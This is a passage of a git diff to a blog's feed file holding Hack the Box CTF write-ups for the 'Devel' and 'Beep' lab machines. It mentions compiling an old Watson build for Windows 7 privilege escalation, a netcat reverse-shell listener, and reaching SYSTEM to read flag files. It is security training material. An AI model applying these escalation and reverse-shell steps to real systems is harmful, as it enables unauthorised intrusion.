+&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;03&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;2017&lt;/span&gt;  &lt;span class="mi"&gt;03&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;                 &lt;span class="mi"&gt;32&lt;/span&gt; &lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;
+               &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;File&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;             &lt;span class="mi"&gt;32&lt;/span&gt; &lt;span class="n"&gt;bytes&lt;/span&gt;
+               &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="n"&gt;Dir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="mi"&gt;31&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;870&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;459&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;904&lt;/span&gt; &lt;span class="n"&gt;bytes&lt;/span&gt; &lt;span class="k"&gt;free&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And like that we now have system privileges on the exploited box! This concludes the guide; thank you for reading.&lt;/p&gt;</content><category term="ctf"></category><category term="ctf"></category><category term="hack the box"></category><category term="oscp prep"></category></entry><entry><title>Beep - Hack the Box</title><link href="https://logistyxcat.github.io%5Chtb-beep.html" rel="alternate"></link><published>2020-04-26T00:00:00-07:00</published><updated>2020-05-03T00:00:00-07:00</updated><author><name>Riley</name></author><id>tag:logistyxcat.github.io\htb-beep.html,2020-04-26:</id><summary type="html">&lt;p&gt;Guide to Beep on Hack the Box.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Description&lt;/h2&gt;
 &lt;p&gt;Beep is a very straightforward Unix box featuring LFI web app exploit.  The path goes pretty much straight to root.&lt;/p&gt;
 &lt;h2&gt;Reconnaissance&lt;/h2&gt;
 &lt;p&gt;To start, we should see what services are available on this box.&lt;/p&gt;
@@ -399,12 +725,12 @@ Ncat: Listening on &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:443
 &lt;h3&gt;Compiling Watson&lt;/h3&gt;
 &lt;p&gt;The only issue with using Watson now is that as of v2.0 it only supports Windows 10 versions; this wasn't always the case.  To use it on Windows 7, we will need to utilize an older version of the software.  We can use Gits built-in commit history functionality using the &lt;code&gt;checkout&lt;/code&gt; function to get the older v0.1 (Win7 compatible) code.&lt;/p&gt;
 &lt;p&gt;To compile the requisite binary, I installed Visual Studio Community (with all C# functionality) and Git on a Windows 10 machine and cloned the Github  repository.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="images/ctf/htb/devel/watson_clone_repo-1.png"&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="images/ctf/htb/devel/watson_clone_repo-2.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Clone repo 1" src="images/ctf/htb/devel/watson_clone_repo-1.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Clone repo 2" src="images/ctf/htb/devel/watson_clone_repo-2.png"&gt;&lt;/p&gt;
 &lt;p&gt;Then, under &lt;strong&gt;Team Explorer&lt;/strong&gt; on the bottom right, there is a list of Local Git Repositories (I have two other projects cloned).  Right click Watson and select &lt;strong&gt;Open Command Prompt&lt;/strong&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="images/ctf/htb/devel/watson_checkout-1.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Checkout 1" src="images/ctf/htb/devel/watson_checkout-1.png"&gt;&lt;/p&gt;
 &lt;p&gt;The last version of Watson that was compatible with other editions of Windows is commit &lt;strong&gt;486ff207270e4f4cadc94ddebfce1121ae7b5437&lt;/strong&gt;.  To get this version, run &lt;code&gt;git checkout 486ff207270e4f4cadc94ddebfce1121ae7b5437&lt;/code&gt; in the command prompt.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="images/ctf/htb/devel/watson_checkout-2.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Checkout 2" src="images/ctf/htb/devel/watson_checkout-2.png"&gt;&lt;/p&gt;
 &lt;p&gt;Now we need the target .NET version.  This can be almost any version isntalled on the machine, but we should know what's available before compiling.&lt;/p&gt;
 &lt;p&gt;Available .NET Framework versions should be listed in &lt;code&gt;C:\Windows\Microsoft.NET\Framework\&lt;/code&gt;.&lt;/p&gt;
 &lt;h4&gt;Back on Devel...&lt;/h4&gt;
@@ -559,7 +885,7 @@ Ncat: Listening on &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:4444
 
 
 &lt;p&gt;Now we have a 'pure' netcat reverse shell.  Executing the exploit again,&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="images/ctf/htb/devel/get_system.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="System Get!" src="images/ctf/htb/devel/get_system.png"&gt;&lt;/p&gt;
 &lt;p&gt;My theory appears to have been correct!  From here, it is trivially easy to locate and read from the flag files.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Both 32 bytes long, the length of an MD5 hash" src="images/ctf/htb/devel/list_flags.png"&gt;&lt;/p&gt;
 &lt;p&gt;This concludes the Devel writeup, and any further content is expanding on the above.&lt;/p&gt;
